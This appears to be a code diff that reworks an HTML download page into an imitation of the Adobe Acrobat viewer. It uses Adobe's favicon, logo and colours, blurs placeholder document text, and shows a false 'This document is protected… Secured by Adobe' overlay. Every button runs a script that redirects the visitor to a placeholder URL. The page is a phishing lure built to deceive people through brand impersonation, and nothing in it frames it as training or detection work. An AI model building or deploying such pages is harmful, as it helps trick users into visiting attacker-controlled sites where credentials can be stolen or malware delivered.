@@ -3,8 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PDF Viewer - Document Ready</title>
+    <title>Adobe Acrobat - PDF Viewer</title>
+    <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
+        @page { size: A4; margin: 0; }
+
         * {
             margin: 0;
             padding: 0;
@@ -12,222 +15,354 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            background-color: #f8f9fa;
+            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #1e1e1e;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Toolbar */
+        .toolbar {
+            background: #2c2c2c;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #3d3d3d;
+        }
+
+        .toolbar-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .toolbar-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toolbar-logo svg {
+            width: 22px;
+            height: 20px;
+        }
+
+        .toolbar-logo span {
+            color: #e0e0e0;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .toolbar-sep {
+            width: 1px;
+            height: 20px;
+            background: #4a4a4a;
+        }
+
+        .toolbar-file {
+            color: #b3b3b3;
+            font-size: 13px;
+        }
+
+        .toolbar-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tb-btn {
+            background: none;
+            border: none;
+            color: #b3b3b3;
+            padding: 7px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.15s ease;
+            font-weight: 500;
+        }
+
+        .tb-btn:hover {
+            background: #3d3d3d;
+            color: #e0e0e0;
+        }
+
+        .tb-btn svg {
+            width: 15px;
+            height: 15px;
+        }
+
+        .tb-btn.accent {
+            background: #EB1000;
+            color: #ffffff;
+        }
+
+        .tb-btn.accent:hover {
+            background: #c40d00;
+        }
+
+        /* Viewer area */
+        .viewer {
+            flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-        }
-
-        .card {
-            background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
-            max-width: 440px;
-            width: 100%;
-            overflow: hidden;
-        }
-
-        /* Top accent */
-        .card-accent {
-            height: 4px;
-            background: linear-gradient(90deg, #4285f4, #34a853, #fbbc04, #ea4335);
-        }
-
-        .card-body {
-            padding: 40px 36px;
-            text-align: center;
-        }
-
-        /* File icon */
-        .file-icon-wrapper {
-            width: 72px;
-            height: 88px;
-            margin: 0 auto 24px;
+            padding: 32px 20px;
             position: relative;
         }
 
-        .file-icon-wrapper svg {
-            width: 100%;
-            height: 100%;
+        .document-page {
+            background: #ffffff;
+            width: 620px;
+            min-height: 800px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .card-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1a1a1a;
+        /* Blurred content */
+        .page-text {
+            padding: 56px 52px;
+            filter: blur(3px);
+            user-select: none;
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .page-text .tl {
+            height: 9px;
+            background: #d4d4d4;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+
+        .page-text .tl.w95 { width: 95%; }
+        .page-text .tl.w88 { width: 88%; }
+        .page-text .tl.w75 { width: 75%; }
+        .page-text .tl.w60 { width: 60%; }
+        .page-text .tl.w92 { width: 92%; }
+
+        .page-text .th {
+            height: 14px;
+            background: #b0b0b0;
+            border-radius: 7px;
+            margin-bottom: 20px;
+            width: 48%;
+        }
+
+        .page-text .gap { height: 28px; }
+
+        /* Download overlay */
+        .doc-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.92);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .overlay-content {
+            text-align: center;
+            max-width: 340px;
+            padding: 28px;
+        }
+
+        .overlay-badge {
+            width: 60px;
+            height: 60px;
+            background: #fff0ef;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .overlay-badge svg {
+            width: 30px;
+            height: 30px;
+        }
+
+        .overlay-content h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #2c2c2c;
             margin-bottom: 8px;
         }
 
-        .card-subtitle {
+        .overlay-content p {
             font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 28px;
-            line-height: 1.5;
+            color: #6e6e6e;
+            line-height: 1.6;
+            margin-bottom: 24px;
         }
 
-        /* File info */
-        .file-info {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 16px 20px;
-            margin-bottom: 28px;
-            display: flex;
+        .overlay-action {
+            display: inline-flex;
             align-items: center;
-            gap: 14px;
-            text-align: left;
-        }
-
-        .file-info-icon {
-            width: 40px;
-            height: 40px;
-            background: #e8f0fe;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-
-        .file-info-icon svg {
-            width: 22px;
-            height: 22px;
-        }
-
-        .file-info-text {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .file-info-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1a1a1a;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .file-info-meta {
-            font-size: 12px;
-            color: #80868b;
-            margin-top: 2px;
-        }
-
-        /* Download button */
-        .btn-download {
-            width: 100%;
-            background: #1a73e8;
+            gap: 8px;
+            background: #EB1000;
             color: #ffffff;
             border: none;
             border-radius: 24px;
-            padding: 14px 28px;
-            font-size: 15px;
+            padding: 13px 32px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: all 0.2s ease;
-        }
-
-        .btn-download:hover {
-            background: #1557b0;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
-        }
-
-        .btn-download svg {
-            width: 18px;
-            height: 18px;
-        }
-
-        /* Scan result */
-        .scan-result {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #34a853;
-        }
-
-        .scan-result svg {
-            width: 14px;
-            height: 14px;
-            fill: #34a853;
-        }
-
-        /* Footer */
-        .card-footer {
-            padding: 16px 36px;
-            background: #f8f9fa;
-            border-top: 1px solid #f0f0f0;
-            text-align: center;
-            font-size: 11px;
-            color: #80868b;
-        }
-
-        .card-footer a {
-            color: #1a73e8;
+            transition: background 0.2s ease, box-shadow 0.2s ease;
             text-decoration: none;
+        }
+
+        .overlay-action:hover {
+            background: #c40d00;
+            box-shadow: 0 4px 16px rgba(235, 16, 0, 0.25);
+        }
+
+        .overlay-action svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .overlay-meta {
+            margin-top: 14px;
+            font-size: 11px;
+            color: #b3b3b3;
+        }
+
+        /* Page info bar */
+        .page-bar {
+            background: #2c2c2c;
+            padding: 8px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .page-bar span {
+            color: #8a8a8a;
+            font-size: 12px;
+        }
+
+        /* Print / PDF styles */
+        @media print {
+            body { background: #ffffff; }
+            .toolbar, .page-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .document-page { box-shadow: none; border: 1px solid #e0e0e0; }
+            .overlay-action { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .overlay-badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="card-accent"></div>
-        <div class="card-body">
-            <!-- File icon -->
-            <div class="file-icon-wrapper">
-                <svg viewBox="0 0 72 88" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M0 6C0 2.69 2.69 0 6 0H46L72 26V82C72 85.31 69.31 88 66 88H6C2.69 88 0 85.31 0 82V6Z" fill="#E8F0FE"/>
-                    <path d="M46 0L72 26H52C48.69 26 46 23.31 46 20V0Z" fill="#AECBFA"/>
-                    <rect x="14" y="48" rx="3" width="44" height="5" fill="#AECBFA"/>
-                    <rect x="14" y="58" rx="3" width="32" height="5" fill="#AECBFA"/>
-                    <rect x="14" y="68" rx="3" width="38" height="5" fill="#AECBFA"/>
-                    <text x="36" y="40" text-anchor="middle" fill="#1a73e8" font-size="14" font-weight="700" font-family="sans-serif">PDF</text>
+    <!-- Toolbar -->
+    <div class="toolbar">
+        <div class="toolbar-left">
+            <div class="toolbar-logo">
+                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
                 </svg>
+                <span>Acrobat</span>
             </div>
-
-            <div class="card-title">Your document is ready</div>
-            <div class="card-subtitle">The PDF has been processed and is available for download.</div>
-
-            <!-- File info -->
-            <div class="file-info">
-                <div class="file-info-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
-                        <polyline points="14 2 14 8 20 8"/>
-                    </svg>
-                </div>
-                <div class="file-info-text">
-                    <div class="file-info-name">Report_Q1_2026_Final.pdf</div>
-                    <div class="file-info-meta">PDF &middot; 4.7 MB &middot; 24 pages</div>
-                </div>
-            </div>
-
-            <!-- Download button -->
-            <button class="btn-download">
+            <div class="toolbar-sep"></div>
+            <span class="toolbar-file">Annual_Review_2026.pdf</span>
+        </div>
+        <div class="toolbar-right">
+            <button class="tb-btn" onclick="handleAction()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="18" cy="5" r="3"/>
+                    <circle cx="6" cy="12" r="3"/>
+                    <circle cx="18" cy="19" r="3"/>
+                    <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
+                    <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
+                </svg>
+                Share
+            </button>
+            <button class="tb-btn accent" onclick="handleAction()">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                     <polyline points="7 10 12 15 17 10"/>
                     <line x1="12" y1="15" x2="12" y2="3"/>
                 </svg>
-                Download PDF
+                Download
             </button>
-
-            <div class="scan-result">
-                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                Scanned &mdash; No issues detected
-            </div>
-        </div>
-
-        <div class="card-footer">
-            Powered by PDF Viewer &middot; <a href="#">Privacy Policy</a> &middot; <a href="#">Terms</a>
         </div>
     </div>
+
+    <!-- Viewer -->
+    <div class="viewer">
+        <div class="document-page">
+            <div class="page-text">
+                <div class="th"></div>
+                <div class="tl w95"></div>
+                <div class="tl w92"></div>
+                <div class="tl w88"></div>
+                <div class="tl w95"></div>
+                <div class="tl w75"></div>
+                <div class="gap"></div>
+                <div class="th" style="width:36%"></div>
+                <div class="tl w95"></div>
+                <div class="tl w88"></div>
+                <div class="tl w92"></div>
+                <div class="tl w95"></div>
+                <div class="tl w60"></div>
+                <div class="gap"></div>
+                <div class="tl w95"></div>
+                <div class="tl w92"></div>
+                <div class="tl w88"></div>
+                <div class="tl w75"></div>
+                <div class="tl w95"></div>
+                <div class="tl w92"></div>
+                <div class="tl w60"></div>
+            </div>
+
+            <div class="doc-overlay">
+                <div class="overlay-content">
+                    <div class="overlay-badge">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#EB1000" opacity="0.2" stroke="#EB1000" stroke-width="1.5"/>
+                            <polyline points="14 2 14 8 20 8" fill="none" stroke="#EB1000" stroke-width="1.5"/>
+                        </svg>
+                    </div>
+                    <h3>Download to view document</h3>
+                    <p>This document is protected. Download the PDF to access the full content.</p>
+                    <button class="overlay-action" onclick="handleAction()">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
+                            <polyline points="7 10 12 15 17 10"/>
+                            <line x1="12" y1="15" x2="12" y2="3"/>
+                        </svg>
+                        Download PDF
+                    </button>
+                    <div class="overlay-meta">2.8 MB &middot; 10 pages &middot; Secured by Adobe</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page bar -->
+    <div class="page-bar">
+        <span>Page 1 of 10</span>
+        <span>&middot;</span>
+        <span>100%</span>
+    </div>
+
+    <script>
+        function handleAction() {
+            window.location.href = 'REDIRECT_URL_HERE';
+        }
+    </script>
 </body>
 </html>
